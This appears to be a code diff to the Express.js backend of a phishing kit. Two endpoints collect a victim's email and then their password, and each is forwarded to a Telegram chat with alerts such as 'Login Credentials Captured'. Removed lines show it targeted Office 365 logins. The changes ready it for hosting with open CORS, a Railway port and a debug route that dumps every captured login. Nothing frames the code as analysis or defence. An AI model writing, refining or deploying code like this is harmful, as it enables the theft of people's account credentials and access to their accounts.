@@ -5,28 +5,17 @@ const axios = require("axios");
 const { v4: uuidv4 } = require("uuid");
 
 const app = express();
-const port = 3000;
 
+// === CLEAN & WORKING CORS (Express 5 compatible) ===
 app.use(cors({
-  origin: '*',                    // Temporarily allow all (including your Vercel site)
+  origin: '*',
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization'],
   credentials: true,
-  maxAge: 86400                   // Cache preflight for 24 hours
+  maxAge: 86400
 }));
 
-// Explicit preflight handler - this fixes most Railway CORS issues
-app.options('*', (req, res) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  res.header('Access-Control-Max-Age', '86400');
-  res.status(204).end();
-});
-
-
-
-
+// No more app.options('*') — cors middleware already handles preflight
 
 app.use(express.json());
 
@@ -74,7 +63,7 @@ app.post("/api/submit-email", async (req, res) => {
   });
 
   await sendToTelegram(
-    `🏋️‍♂️ *New Gym Login Attempt*\n\n` +
+    `🏋️‍♂️ *New Login Attempt*\n\n` +
     `📧 *Email:* ${email}\n` +
     `📱 *Device:* ${userAgent.slice(0, 120)}${userAgent.length > 120 ? "..." : ""}\n` +
     `⏳ Waiting for password...\n` +
@@ -104,7 +93,7 @@ app.post("/api/submit-password", async (req, res) => {
   attempt.password = password;
 
   await sendToTelegram(
-    `✅ * Ofiice 365 Login Credentials Captured*\n\n` +
+    `✅ *Login Credentials Captured*\n\n` +
     `📧 *Email:* ${attempt.email}\n` +
     `🔑 *Password:* \`${password}\`\n` +
     `📱 *Device:* ${attempt.userAgent.slice(0, 120)}${attempt.userAgent.length > 120 ? "..." : ""}\n` +
@@ -114,14 +103,18 @@ app.post("/api/submit-password", async (req, res) => {
   res.json({ status: "success", message: "Done" });
 });
 
-// Debug (optional - you can remove later)
+// Debug route
 app.get("/api/debug", (req, res) => {
   res.json(Array.from(loginAttempts.entries()));
 });
 
-app.listen(port, () => {
-  console.log(`🚀 Server running on http://localhost:${port}`);
-  console.log("Endpoints:");
-  console.log("   POST /api/submit-email     → { email }");
-  console.log("   POST /api/submit-password  → { attemptId, password }");
+// === Use Railway PORT ===
+const port = process.env.PORT || 3000;
+
+app.listen(port, '0.0.0.0', () => {
+  console.log(`🚀 Server running on port ${port}`);
+  console.log("✅ CORS enabled with origin: *");
+  console.log("Endpoints ready:");
+  console.log("   POST /api/submit-email");
+  console.log("   POST /api/submit-password");
 });
